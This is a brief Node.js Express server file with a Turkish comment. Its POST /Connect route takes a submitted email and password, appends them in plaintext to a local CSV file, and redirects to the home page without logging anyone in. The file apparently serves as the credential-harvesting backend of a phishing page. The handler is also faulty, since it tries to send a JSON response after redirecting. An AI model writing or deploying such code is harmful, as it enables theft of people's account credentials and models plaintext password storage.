/*

GEREKLİ PAKETLER YÜKLENİYOR...

*/

var http = require('http');
const express = require('express');
const bodyParser = require('body-parser');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const fs = require('fs');
const path = require('path');
const csvWriter = require('csv-write-stream');

const csvFilePath = path.join(__dirname, 'data.csv');
var app = express();

app.set('port', process.env.PORT || 3000); 
app.set('views', __dirname + '/app/server/views'); 
app.set('view engine', 'ejs'); 
app.use(express.static(__dirname + '/app/public')); 
app.use(bodyParser.urlencoded({ extended: true }));
require('./app/routes')(app); 




app.post('/Connect', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Create a CSV writer if the file does not exist or append to the existing file
    const writer = csvWriter({ headers: ['email', 'password'], sendHeaders: !fs.existsSync(csvFilePath) });
    writer.pipe(fs.createWriteStream(csvFilePath, { flags: 'a' }));

    // Write the email and password to the CSV file
    writer.write({ email, password });

    // Close the CSV writer
    writer.end();

    res.redirect('/');
    res.status(200).json({ message: 'Data saved successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'An error occurred while saving data' });
  }
});


http.createServer(app).listen(app.get('port'), function(){
	console.log('PORT: ' + app.get('port'));
});

